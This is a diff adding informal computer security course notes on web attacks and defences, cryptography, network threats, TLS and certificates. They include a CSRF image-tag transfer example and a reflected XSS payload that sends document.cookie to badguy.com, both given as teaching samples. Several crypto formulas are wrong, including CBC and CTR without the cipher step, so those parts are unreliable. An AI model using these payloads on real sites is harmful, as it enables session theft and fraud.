@@ -1,0 +1,536 @@
+
+
+#Security Principles
+* Least Privilege
+* Complete Mediation
+* Separation of responsibility
+* Defense in depth
+* psychological acceptability
+* consider human factors
+* only secure as weakest link
+* don't rely on security through obscurity
+* trusted path
+
+
+fuzz testing
+- random inputs
+
+
+url:
+http://safebank.com:81/account?id=10#statement
+protocol://hostname:port/path?query#fragment
+
+#HTTP Request
+GET /account.html HTTP/1.1
+Host: www.safebank.com
+
+#HTTP Response
+HTTP/1.0 200 OK
+<HTML> ... </HTML>
+
+web page
+* HTML - HTML Parser
+* CSS - CSS Parser
+* JS - JS Engine
+DOM tree -> Painter -> bitmap
+
+#frames:
+* enable embedding a page w/in a page
+<iframe src='url'></iframe>
+
+frame isolation: outer page cannot change contents of inner page; inner page cannot change contents of outer page
+
+#SOP (Same Origin Policy)
+Each site in browser is isolated from all others
+Multiple pages from same site are not isolated
+--> granularity of protection for same origin
+
+origin = protocol + hostname + port
+One origin should not be able to access resources of another origin
+
+browsing to evil.com should not let evil.com spy on our emails in Gamil, etc
+
+#Web Security
+Integrity - integrity of our computers / information on web
+Confidentiality - no reading our confidential info
+Privacy - no spying
+Availability - no preventing us from accessing the web
+
+symmetric & asymmetric encryption (RSA)
+symmetric ciphers are fast
+
+#(OS) Command Injections
+ie) malicious inputs into "grep". you can use execve()
+
+sanitize inputs.
+
+#CSRF (HTML only)
+Cookie theft: Attacker who can get a copy of Alice's cookie can access the server impersonating Alice
+
+Often have an image tag with a website to evil.com
+<img src="https://mybank.com/moneyxfer.cgi?Account=alice&amt=500000&to=DrEvil">
+
+So if we visit a page under attacker's control, they can have us visit other urls. when we do our browser sents along any cookies associated w/ the url
+
+
+**Defense**
+`Referer Validation`
+- when browser issues HTTP request, it includes a Referer header that indicates which URL initiated the request. 
+- web server can use information in referer header to distinguish between same-site requests vs X-site requests
+
+
+`Secret Validation Token`
+- server requests a secret token for every action
+- the user's browser will have obtained this token if the user visited the site and browsed to that action
+- if the attacker directly sends, the browser won't have that token
+
+validation token must be hard to guess by attacker and changes everytime
+
+#XSS (requires JS)
+subverts SOP
+Your browser executes the attacker's own script. One way is the trick the server of interest to request the attacker's script to your browser. 
+
+Then no matter how carefully you check it, it views the script as from the same origin
+
+`Stored / Persistent`
+Attacker leaves their script lying around mybank.com server
+- server unwittingly sends it to your browser. 
+- your browser executes it w/in the same origin as mybank.com server
+
+`Reflected`
+Attacker gets you to send mybank.com server a URL that has JS script crammed into it
+- server echoes it back to you
+- browser executes the script in the response w/in same origin as mybank.com
+
+http://victim.com/search.php?term=
+<script> window.open("http://badguy.com?cookie = " + document.cookie) </script>
+
+1. browser goes to victim.com/search
+2. victim.com returns <HTML> Results for <script> ... </script> 
+3. browser executes script in same origin as victim.com. sends badguy.com cookie for victim.com
+
+
+**Defense**
+OWASP = Open Web Application Security Project
+1. Never insert untrusted data except in allowed locations
+2. HTML-escape before inserting untrusted data into simple HTML element contents
+3. HTML-escape all non-alphanumeric characters before inserting untrusted data into simple attribute contents
+
+& --> &amp;
+< --> &lt;
+> --> &gt;
+" --> &quot;
+' --> &#x27;
+/ --> &#x2F;
+
+**CSP** (Content Security Policy)
+prevent XSS by specifying a `white-list` from where a browser can load resources  for a given web page
+
+#Clickjacking
+place an invisible iframe of target.com over some enticing content. Attacker can steal user's mouse clicks and key strokes
+
+**Defense**
+* Require confirmation for actions
+* Frame-busting: web sites ensure you can't put iframe insider another iframe
+* HTTP X-Frame-Options header - allows white-listing of what domains are allowed to frame a given page a server returns
+
+
+#SQL Injection Attacks
+use Prepared statements to protect against them
+
+SQL statements are interpreted as parse tree. 
+Prepared statements makes structure of parse tree fixed. no new expressions allowed
+
+
+#Cryptography Goals
+* Confidentiality - can't read msg
+* Integrity - can't change msg
+* Authentication - you are who you say you are
+
+Kerckhoffs' Principle
+* Crystosystems should remain secure even when attacker knows all internal details. (don't rely on security through obscuirty)
+* keys should be the only thing that is secret.
+* it should be easy to change keys
+
+
+#One-Time Pad
+- use different key each time
+- C = M ^ K (xor)
+- C ^ K = M ^ K ^ K = M
+Problem
+1. key generation (truly random, indep key)
+2. key distribution
+
+Two-time Pad
+C = M ^ K, C' = M' ^ K
+C ^ C' = M ^ M'
+
+
+#Symmetric Key
+uses Block Cipher
+AES (Advanced Encryption Standard)
+Block size = 128 bits
+keys can be 128, 192, or 256 bits. AES-128
+2^128 = 2^(10*12.8) = 10^(3*12.8) = 10^39
+
+Block ciphers can only encrypt blocks of certain size. So if M is smaller, pad it, if M is bigger, repeatedly apply block cipher
+
+if same data is encrypted twice, attacker knows its the same. So add a varying quantity in IV = initialization vector
+
+#(ECB) mode
+encrypt each block independently. Problem is identical message when encrypted looks the same. (Penguin problem)
+
+#(CBC) mode (Cipher Block Chaining)
+C1 = IV ^ P1
+C2 = C1 ^ P2
+...
+CN = C(N-1) ^ PN
+
+Eve sees (IV, C1, C2, ... CN)
+
+sequential, hard to parallelize.
+
+# (CTR) mode. parallelizable.
+C1 = P1 ^ (Nonce + Counter)
+C2 = P2 ^ (Nonce + Counter+1)
+
+Basically CBC but done in parallel
+
+#Stream Ciphers
+blocks: fixed-size, stateless
+streams: keeps state from processing past message elements. Can continually process new elements
+
+#(PRNG) Pseudo Random Number Generator
+Given a seed, outputs sequence of seemingly random bits
+For seed length s, it can only generate at most 2^s distinct possible sequences.
+
+essentially a cheap one-time pad.
+
+E = PRNG(K, IV) ^ M
+D = PRNG(K, IV) ^ C
+
+PRNG(Seed, IV) = { return AES-128_seed(++N ^ IV) }
+
+Difference between CTR & PRNG is the different operator (concatenation vs xor to combine IV & counter)
+
+Both CTR & PRNG are cryptographically secure as long as IV/Nonce are random
+
+#Asymmetric Keys
+RSA
+Tot(p*q) = (p-1)*(q-1) if p, q are prime.
+a ^ (Tot(n)) = 1 mod n 
+
+2 < e < Tot(n)
+d = e^(-1) mod Tot(n)
+
+public key operations are much slower than block cipher operations
+
+
+# Hash Functions
+- variable input size
+- fixed output size (ie. 512 bytes)
+- efficient to compute
+- pseudo-random
+
+collision occurs if x != y, but H(x) == H(y)
+
+1. One-way. h = Hash(x) easy to compute but not other way | "preimage resistant"
+2. 2nd preimage resistant: given x, intractable to find x' s.t. H(x) == H(x')
+3. Collision resistant: intractable to find any x, y s.t. H(x) == H(y)
+
+collision resistant => 2nd preimage resistant
+
+MD5, SHA-1 broken!!
+
+#MAC (Message Authentication Code)
+Symmetric-key approach for integrity. Whoever sent it must have had possession of key K.
+
+Alice sends Bob {M, T} where T = F(K, M)
+Bob receives {M', T'}. Bob checks whether T' = F(K, M')
+- if so, message is untampered
+- else, message is tampered
+
+`HMAC`: building a MAC out of a secure hash function
+HMAC(M, K) = H[(K* ^ Pad0) || H((K* ^ Pad1) || M)]
+
+AES-EMAC = building MAC out of secure block cipher
+S1 = P1 AES K1
+S2 = (P2 ^ S1) AES (K1)
+...
+T = Sn AES K2
+
+
+Digital Signatures
+- using asymmetric key
+S = H(M)^(d') mod n' == sign
+if H(M) = S^(e') mod n' then verified
+- provides non-repudation. You can't deny that you signed it
+
+difference between PRNG/ stream cipher and one-time pad?
+
+
+#Key Exchange
+1. `(DHE) Diffie-Hellman Key Exchange`
+works for Eve but not Mallory
+
+Alice <- A = g^a mod p,  (p, g, a)
+Bob <- B = g^b mod p, (p, g, b)
+
+Alice then computes K = B ^ a mod p = g^(ab) mod p
+Bob computes K = A ^ b mod p = g^(ab) mod p
+Eve only get A and B. So she get A*B = g^(a+b) mod p which is different!!
+
+MITM could however foil this
+
+2. `Certificate Authorities`
+(PKI) - public key infrastructure
+
+How does CA recover from error?
+1. Expiration Dates
+2. Revoke cert. (CRL) Cert Revocation List. Sign the list. 
+3. CA provides service to query. OCSP = Online Certificate Status Protocol
+
+
+Leap-of-Faith Authentication
+- TOFU (Trust on First use)
+- popular for ssh
+
+#Network
+
+Physical/Link Layer Threats: Eavesdropping / Sniffing
+- tcmpdump, Wireshark
+- each attached system's NIC can capture any communication on the subnet
+- tap a link
+
+
+#WPA2. cryptographic exchange w/ public wifi (coffee shop)
+`"Personal"`
+K = F(HMAC-SHA1, "password", "networkname", KeyCounter, 4096)
+Take xor of "networkname" & KeyCounter.
+Use password as MAC key and take the xor as initial input
+compute HMAC-SHA1 for 4096 iterations.
+
+each subsequent iteration takes output of the previous computation is its input
+
+`"Enterprise"`  (secure but inconvenient form)
+laptop is preconfigured w/ cert for an Authentication Server
+- establish secure connection to Authentication Server via TLS
+- Transmit authentication and get back random secret key.
+
+
+blind spoofing = spoofing w/o eavesdropping
+"on path" - attacker can see victim's traffic
+"off path" - attacker can't see victim's traffic. must resort to blind spoofing. -> brute force
+
+#DHCP threats
+* substitute fake DNS server
+* substitute fake gateway router
+hard because we lack `trust anchor` like a CA
+
+#TCP threats (TCP connection / session hijacking)
+* abruptly terminate by sending RST msg or insert data.
+* if attacker knows `port` and `sequence number`, can disrupt any TCP connection
+* allows attackers to "frame" ABC / otherwise avoid detection
+* fixed today by choosing `random ISN`
+
+#DNS threats
+* cache poisoning
+
+fix cache poisoning
+"bailiwick checking"
+- Don't accept Additional records unless they're for the domain of the name server we queried. 
+ie) contacting a name server for mit.edu => only accept additional records from *.mit.ed
+
+#DNS blind-spoofing (Kaminsky)
+off-path attacker
+
+1. similar to CSRF, visit a web page under their control
+<img src="https://mail.google.com">
+Then we look up mail.google.com. So they can send a bogus DNS reply.
+
+2. Spoof uses Additional field rather than Answer
+Attacker can get around caching of legit replies by generating a series of different name lookups
+
+<img src='http://random1.google.com'>
+<img src='http://random2.google.com'>
+<img src='http://random3.google.com'>
+for each record, spoof it. 
+
+Once they win the race, not only have they poisoned mail.google.com but they also cached NS record for google.com's name server - so any future X.google.com lookups go through the attacker's machine
+
+defense?
+Use SRC port + Identification field for 32 bits of randomness
+(you can do this since both src & dst port are 53 for DNS)
+
+
+#Firewall
+- white-list
+- default deny
+adv
+* central control - easy admin and update
+* easy to deploy
+* addresses important problem
+diadv
+* functionality loss (less connectivity)
+* malicious insider problem (deployment assumes insiders are trusted)
+* establish a security perimeter
+
+subvert firewall by running on different port (bitTorrent)
+
+Hiding on Other Ports
+1 - use ports allocated to another service
+2 - tunneling
+    * encapsulate 1 protocol insider another
+    * receiver of "outer" protocol decapsulates interior tunneling protocol to recover it
+    * pretty much any protocol can be tunneled over another
+ie) tunneling IP over SMTP
+
+tunneling = sender & receiver at each side of tunnel both cooperate
+traffic takes properties of outer protocol
+ie) VPN. 
+* tunnel server relays remote client's packets
+* makes remote machines look like it's local to its home network
+* tunnel encrypts traffic for privacy & to prevent meddling
+
+Application Proxies
+can more directly control applications by requiring them to go through a proxy for external access
+- SSH gateway
+
+
+#DOS (Denial of Service)
+exhaust resources (CPU, memory, bandwidth) to shut down availability
+often does this by having the response be much bigger than the request such as DNS queries / TCP SYN Flooding
+
+**Defense**
+`SYN cookies`
+When Syn arrives, encode critical state entriely w/in SYN-ACK's sequence number #y!
+When Ack of SYN-ACK arrives, server only creates state if value y matches w/ secret.
+
+- for SYN cookies, attacker must complete 3 way handshake in order to burden server
+- 
+
+#TLS/SSL (provides channel security)
+end-end security. integrity, encryption, signatures.
+
+1. Client sends 256 bit random number Rb and supported ciphers
+2. Server sends 256 bit random number Rs and chosen cipher
+3. Server sends cert
+4. DH: Server sends {g, p, g^a mod p}K^(-1)server
+5. Server signals end of handshake
+6. DH: Client sends g^b mod p.
+   RSA: Client sends {PS}K_server
+   Client and Server derive cipher keys Cb, Cs, and integrity keys Ib, Is from Rb, Rs, PS
+7. Client sends MAC(dialog, Ib)
+8. Server sends MAC(dialog, Is)
+9. Client data takes the form {M1, MAC(M1, Ib)}Cb
+10. Server data takes form {M2, MAC(M2, Is)}Cs
+
+
+* Attacker sniffs to capture our WiFI session
+- Encrypted communication is unreadable. Check
+
+* DNS cache poisonin
+- Client goes to wrong server. detects impersonation since attacker lacks valid cert. Check
+
+* Attacker hijacks our connection, injects new traffic
+- data receiver rejects it due to failed integrity check. Check
+
+* DHCP spoofing?
+- same as DNS
+
+* Attacker manipulates routing to run us by an eavesdropper or take us to the wrong server?
+- Encrpyted communication. Check
+
+* Attacker slips in MITM?
+- They can't read, they can't inject. Can't replay previous encrypted traffic. Check
+
+
+`Certificate pinning` - requires that certs for certain domains must be signed by specific CAs rather than any generally trusted CA
+
+
+#DNSSEC (securing DNS lookups) (Objecy Security)
+provides integrity and authenticity
+tailored to be cache friendly
+
+at each level of DNS, there is a key
+
+
+#NIDS (Network Intrusion Detection System)
+- simpler management. can cover lot of systems w/ single deployment
+- no need to touch end systems
+
+#HIDS (Host Intrustion Detection System)
+- can have direct access to semantics of activity
+- visibility into encrypted activity
+- can protect against non-network threats
+- performance scales much more readily
+
+
+#Rainbow Table Attacks
+
+#Time Attacks
+
+#Buffer Overflows
+buffer copy w/o checking size of input
+
+#Stack Smashing
+
+
+
+
+#Message Security
+
+provide encryptions and digital signature
+aka Confidentiality, Integrity, and Authentication
+
+Sending Message
+---------------
+write msg
+get recipient's public key from CA certificate
+get sender's private key from CA certificate
+hash msg
+sign hash w/ my private key
+append signature to msg
+generate 1 time symmetric key (session key)
+encrypt msg w/ session key
+encrypt session key w/ recipient's public key
+send msg
+
+Receiving Message
+----------------
+get recipient's private key from CA
+get sender's public key from CA
+decrypt session key w/ my private key
+decrypt encrypted msg w/ session key
+hash msg
+decryp the signature w/ sender's public key
+if 2 hash match, msg is good, else tampered
+
+
+#Certificates - 3rd party where users can find other user's public key
+
+CA hands out identified certificate's owner and their public key
+CA will digitally sign each cert w/ it's private key
+so if msg is tampered, compare it w/ signature
+
+essentially 3rd party signs your public key and vouches that your public key is correct and has not been intercepted by MITM
+
+`2 weaknesses!`
+If you can get CA to fraudulently sign keys, then all people trusting them are completely out of luck
+
+Some dutch CA got bankrupt because they generated a valid signed certificate for google when they had no right to do that
+
+There is a list of trusted CAs in your phone /computer. If an attacker can list themself as a trusted CA, they can generate new keys on the fly. So they can literally sit on your computer and do MITM attacks.
+
+Superfish enlisted themselves as a trusted CA.
+
+
+
+
+
+
+
+
+
+
+
